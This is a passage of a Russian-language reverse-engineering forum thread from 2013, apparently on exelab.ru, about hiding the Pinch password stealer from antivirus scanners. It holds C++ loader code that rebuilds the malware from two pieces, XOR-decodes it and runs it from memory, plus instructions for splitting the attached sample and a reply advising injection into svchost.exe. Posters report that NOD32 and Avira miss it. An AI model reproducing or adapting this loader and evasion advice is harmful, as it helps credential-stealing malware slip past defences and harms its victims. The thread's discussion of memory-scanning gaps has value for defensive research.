class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span><span class="hl_quote">&quot;C:\Windows\winsxs\x86_microsoft-windows-winhstb_31bf3856ad364e35_6.1.7600.16385_none_28dc647c6aba6742\winhlp32.exe_1&quot;</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>long&nbsp;size&nbsp;<span class="hl_char">=</span>&nbsp;fisize&nbsp;<span class="hl_char">(</span>file_to_use<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf&nbsp;<span class="hl_char">(</span><span class="hl_quote">&quot;PINCH SIZE: %d\n&quot;</span><span class="hl_char">,</span>size<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span>&nbsp;выделяем&nbsp;память</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">BYTE</span><span class="hl_char">*</span>&nbsp;ptd<span class="hl_comment">; </span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptd&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span><span class="hl_function"><b>BYTE</b></span>&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span>malloc<span class="hl_char">(</span>size&nbsp;<span class="hl_char">*</span>&nbsp;<span class="hl_function">sizeof</span><span class="hl_char">(</span><span class="hl_function">BYTE</span><span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">; </span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">if</span><span class="hl_char">(</span>ptd&nbsp;<span class="hl_char">!</span><span class="hl_char">=</span>&nbsp;<span class="hl_function">NULL</span><span class="hl_char">)</span>{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf&nbsp;<span class="hl_char">(</span><span class="hl_quote">&quot;MEMORY IS ALLOCATED!\n&quot;</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>fill_buffer&nbsp;<span class="hl_char">(</span>file_to_use<span class="hl_char">,</span>ptd<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fill_buffer&nbsp;<span class="hl_char">(</span><span class="hl_quote">&quot;C:\Users\Isupov\Desktop\virus\Pinch_editor\Pinch_editor\Pinch_Editor\part1.exe&quot;</span><span class="hl_char">,</span>ptd<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fill_buffer&nbsp;<span class="hl_char">(</span><span class="hl_quote">&quot;C:\Users\Isupov\Desktop\virus\Pinch_editor\Pinch_editor\Pinch_Editor\part2.exe&quot;</span><span class="hl_char">,</span>ptd<span class="hl_char">+</span><span class="hl_number">9728</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;<span class="hl_char">(</span><span class="hl_function"><b>int</b></span>&nbsp;i<span class="hl_char">=</span><span class="hl_number">9728</span><span class="hl_comment">;i&lt;size;i++) ptd[i]=(ptd[i]^0x77)-1;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<span class="hl_function"><b>else</b></span>&nbsp;printf<span class="hl_char">(</span><span class="hl_quote">&quot;CANNOT ALLOCATE MEMORY!\n&quot;</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>for&nbsp;<span class="hl_char">(</span><span class="hl_function"><b>int</b></span>&nbsp;i<span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_comment">; i&lt;40;i++) printf (&quot;%x &quot;, ptd [i]);</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>free<span class="hl_char">(</span>ptd<span class="hl_char">)</span><span class="hl_comment">; //9728</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span><span class="hl_function"><b>BYTE</b></span>&nbsp;<span class="hl_char">*</span>z<span class="hl_char">=</span><span class="hl_char">&amp;</span>ptd<span class="hl_char">[</span><span class="hl_number">500</span><span class="hl_char">]</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RunFromMemory<span class="hl_char">(</span><span class="hl_char">(</span><span class="hl_function"><b>char</b></span>&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span>ptd<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_char">=</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getchar&nbsp;<span class="hl_char">(</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free&nbsp;<span class="hl_char">(</span>ptd<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l1">}</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">long&nbsp;fisize&nbsp;<span class="hl_char">(</span><span class="hl_function"><b>char</b></span>&nbsp;<span class="hl_char">*</span>fname<span class="hl_char">)</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">{</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">FILE&nbsp;<span class="hl_char">*</span>fin<span class="hl_comment">;</span></li><li class="hl_l0"><span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span><span class="hl_char">!</span><span class="hl_char">(</span>fin&nbsp;<span class="hl_char">=</span>&nbsp;fopen<span class="hl_char">(</span>fname<span class="hl_char">,</span>&nbsp;<span class="hl_quote">&quot;rb&quot;</span><span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_char">)</span>&nbsp;{std<span class="hl_char">:</span><span class="hl_char">:</span>cout&nbsp;<span class="hl_char">&lt;</span><span class="hl_char">&lt;</span>&nbsp;<span class="hl_quote">&quot;Binary file is not found!&quot;</span><span class="hl_char">&lt;</span><span class="hl_char">&lt;</span><span class="hl_function">std</span><span class="hl_char">:</span><span class="hl_char">:</span>endl<span class="hl_comment">; return 0;}	;</span></li><li class="hl_l1">long&nbsp;size<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">fseek<span class="hl_char">(</span>fin<span class="hl_char">,</span>&nbsp;<span class="hl_number">0</span><span class="hl_char">,</span>&nbsp;SEEK_END<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">size&nbsp;<span class="hl_char">=</span>&nbsp;ftell<span class="hl_char">(</span>fin<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">fseek<span class="hl_char">(</span>fin<span class="hl_char">,</span>&nbsp;<span class="hl_number">0</span><span class="hl_char">,</span>&nbsp;SEEK_SET<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">fclose<span class="hl_char">(</span>fin<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">return&nbsp;<span class="hl_char">(</span>size<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">}</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">long&nbsp;fill_buffer&nbsp;<span class="hl_char">(</span><span class="hl_function"><b>char</b></span>&nbsp;<span class="hl_char">*</span>fname<span class="hl_char">,</span>&nbsp;<span class="hl_function"><b>BYTE</b></span>&nbsp;<span class="hl_char">*</span>&nbsp;buff<span class="hl_char">)</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">{</li><li class="hl_l1">long&nbsp;size<span class="hl_char">=</span>fisize&nbsp;<span class="hl_char">(</span>fname<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0"><span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>size<span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_char">)</span>&nbsp;return&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">FILE&nbsp;<span class="hl_char">*</span>fin<span class="hl_comment">;</span></li><li class="hl_l1">fin&nbsp;<span class="hl_char">=</span>&nbsp;fopen<span class="hl_char">(</span>fname<span class="hl_char">,</span>&nbsp;<span class="hl_quote">&quot;rb&quot;</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">for&nbsp;<span class="hl_char">(</span><span class="hl_function"><b>int</b></span>&nbsp;i<span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_comment">;i&lt;size;i++) fread (&amp;buff [i],sizeof (BYTE),1,fin);</span></li><li class="hl_l0">fclose<span class="hl_char">(</span>fin<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">return&nbsp;<span class="hl_char">(</span><span class="hl_number">1</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">}</li>        </ol>
    </div>
</div></div><br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332026&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=5" class="addthx" data-post="332026"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="6" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 19:15 &middot; Поправил: Crawler <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#6" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#6');return false;">#6</a> </span><div align=left><br>
Вывод такой: ни нод, ни авира не смотрят, что реально находится в памяти процесса. Или я чего-то не понимаю.<br><br>Чтобы было понятнее:<br><br>1) Запускаю файл с жесткого диска - детектится<br><br>2) Тот же файл режу на 2 куска, склеиваю и запускаю из памяти - не детектится даже после принудительной проверки памяти.
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332027&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=6" class="addthx" data-post="332027"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="7" onfocus="this.blur()" href="JavaScript:di('[b]reversecode[/b]','')">reversecode</a></b><br></div>
<img src="img/s9.gif" alt=""><br><img style="padding-top:3px;" src="av/15381.gif" alt=""><br><span class=txtSm>Ранг: 1053.6 <b><u>(!!!!)</u></b>, 1078thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 12.43'>Активность: 1.06<span style='color:red'>&searr;</span>0.81</span><br>Статус: <a href="action=userinfo&amp;user=15381">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 19:27 <br><script type="text/javascript">QU('reversecode','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=reversecode" target="_blank">Личное сообщение</a> &middot;  <a href="#7" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#7');return false;">#7</a> </span><div align=left><br>
а что говорит drweb cureit ?<br>там вроде даже спец опция есть - тест памяти
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=332028&amp;user=15381&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=7" class="addthx" data-post="332028"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:inline"> | Сообщение посчитали полезным: <span class="total_thx"><a href="action=userinfo&user=33727" title="13-10-2013 10:09, ранг:15.4" target="_blank">Dr0p</a></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="8" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 19:41 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#8" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#8');return false;">#8</a> </span><div align=left><br>
<b>reversecode</b><br>Только что проверял, ничего не говорит. Молчит.
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332029&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=8" class="addthx" data-post="332029"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="9" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 19:44 &middot; Поправил: Crawler <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#9" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#9');return false;">#9</a> </span><div align=left><br>
Кому интересно - вот сам файл. Нужно разрезать его по смещению 0x2600 и назвать части &quot;part1.exe&quot; и &quot;part2.exe&quot;. Ну, и в коде пути к файлам поправить, соответственно.<br><br><br><img src="img/attach.gif" alt=""> <a href="./files/61af_09.10.2013_EXELAB.rU.tgz">61af_09.10.2013_EXELAB.rU.tgz</a> - winhlp32.exe<br><br>п.с. запускал под win7 x64
<br><br><font size="1"><i>-----<br>Харе курить веники и нюхать клей, к вам едет из Америки бог Шива, и он еврей.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332030&amp;user=4825&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=9" class="addthx" data-post="332030"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="10" onfocus="this.blur()" href="JavaScript:di('[b]ZaZa[/b]','')">ZaZa</a></b><br></div>
<img src="img/s5.gif" alt=""><br><img style="padding-top:3px;" src="av/3691.jpg" alt=""><br><span class=txtSm>Ранг: 158.5 (ветеран), 219thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.44'>Активность: 0.12<span style='color:red'>&searr;</span>0.01</span><br>Статус: <a href="action=userinfo&amp;user=3691">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 20:26 <br><script type="text/javascript">QU('ZaZa','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ZaZa" target="_blank">Личное сообщение</a> &middot;  <a href="#10" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#10');return false;">#10</a> </span><div align=left><br>
Ну вот и спалили уязвимость 0day... Ну и правильно, ибо нефих... К вирусне отношусь крайне отрицательно и воюю с ней периодически на компьютерах пользователей... <img src="img/smilies/s10.gif" alt="">
<br><br><font size="1"><i>-----<br>One death is a tragedy, one million is a statistic.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332032&amp;user=3691&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=10" class="addthx" data-post="332032"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="11" onfocus="this.blur()" href="JavaScript:di('[b]ELF_7719116[/b]','')">ELF_7719116</a></b><br></div>
<img src="img/s7.gif" alt=""><br><span class=txtSm>Ранг: 419.0 (мудрец), 647thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 9.74'>Активность: 0.46<span style='color:green'>&nearr;</span>0.51</span><br>Статус: <a href="action=userinfo&amp;user=26651">Участник</a><br><font color=blue>&quotТибериумный реверсинг&quot</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 20:32 <br><script type="text/javascript">QU('ELF_7719116','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ELF_7719116" target="_blank">Личное сообщение</a> &middot;  <a href="#11" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#11');return false;">#11</a> </span><div align=left><br>
В продолжение темы: Помнится есть привилегия SE_LOCK_MEMORY_NAME (+AllocateUserPhysicalPages)- можно застолбить место в физической памяти, не привязываясь к определенному процессу. По идеи, это вообще шикарная вещь для мавари или я ошибаюсь?
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=332033&amp;user=26651&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=11" class="addthx" data-post="332033"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="12" onfocus="this.blur()" href="JavaScript:di('[b]Alchemistry[/b]','')">Alchemistry</a></b><br></div>
<img src="img/s5.gif" alt=""><br><span class=txtSm>Ранг: 145.8 (ветеран), 191thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 11.06'>Активность: 0.14<span style='color:green'>&nearr;</span>0.36</span><br>Статус: <a href="action=userinfo&amp;user=21411">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 20:46 <br><script type="text/javascript">QU('Alchemistry','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Alchemistry" target="_blank">Личное сообщение</a> &middot;  <a href="#12" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#12');return false;">#12</a> </span><div align=left><br>
<b>Crawler</b><br>Попробуй заинжектить свой пинч в какой-нибудь системный процесс, типа svchost.exe и запусти проверку. Может так поможет.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=332034&amp;user=21411&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=12" class="addthx" data-post="332034"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="13" onfocus="this.blur()" href="JavaScript:di('[b]DenCoder[/b]','')">DenCoder</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/24257.jpg" alt=""><br><span class=txtSm>Ранг: 324.3 (мудрец), 221thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 10.42'>Активность: 0.48<span style='color:red'>&searr;</span>0.37</span><br>Статус: <a href="action=userinfo&amp;user=24257">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 10 октября 2013 10:10 <br><script type="text/javascript">QU('DenCoder','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=DenCoder" target="_blank">Личное сообщение</a> &middot;  <a href="#13" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#13');return false;">#13</a> </span><div align=left><br>
Большинство антивирусов при сканировании памяти проверяют только спроецированные на выполнение файлы
<br><br><font size="1"><i>-----<br>IZ.RU</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=332052&amp;user=24257&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=13" class="addthx" data-post="332052"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="14" onfocus="this.blur()" href="JavaScript:di('[b]Archer[/b]','')">Archer</a></b><br></div>
<img src="img/s9.gif" alt=""><br><img style="padding-top:3px;" src="av/1556.jpg" alt=""><br><span class=txtSm>Ранг: 2014.5 <b><u>(!!!!)</u></b>, 1278thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.27'>Активность: 1.34<span style='color:red'>&searr;</span>0.25</span><br>Статус: <a href="action=userinfo&amp;user=1556">Модератор</a><br><font color=blue>retired</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 10 октября 2013 10:26 <br><script type="text/javascript">QU('Archer','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Archer" target="_blank">Личное сообщение</a> &middot;  <a href="#14" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#14');return false;">#14</a> </span><div align=left><br>
SE_LOCK_MEMORY_NAME, насколько я помню, лочит физическую память и нужна в основном для AWE. К физической памяти без мапинга на виртуальную в какой-то процесс всё равно обратиться не выйдет. Так что профит для малвари сомнителен.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=332055&amp;user=1556&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=14" class="addthx" data-post="332055"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="15" onfocus="this.blur()" href="JavaScript:di('[b]SReg[/b]','')">SReg</a></b><br></div>
<img src="img/s7.gif" alt=""><br><span class=txtSm>Ранг: 315.1 (мудрец), 631thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 11.78'>Активность: 0.3<span style='color:green'>&nearr;</span>0.33</span><br>Статус: <a href="action=userinfo&amp;user=18316">Модератор</a><br><font color=blue>CrackLab</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 10 октября 2013 10:30 <br><script type="text/javascript">QU('SReg','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=SReg" target="_blank">Личное сообщение</a> &middot;  <a href="#15" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#15');return false;">#15</a> </span><div align=left><br>
<I>DenCoder пишет:<br>только спроецированные на выполнение файлы </I><br>есть образ в памяти, есть синги - должен детектиться!<br>зы. и да откуда инфа кто и когда управление передаст?
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=332056&amp;user=18316&amp;forum_n=7&amp;topic=22241&amp;page=0&amp;anchor=15" class="addthx" data-post="332056"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="16" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
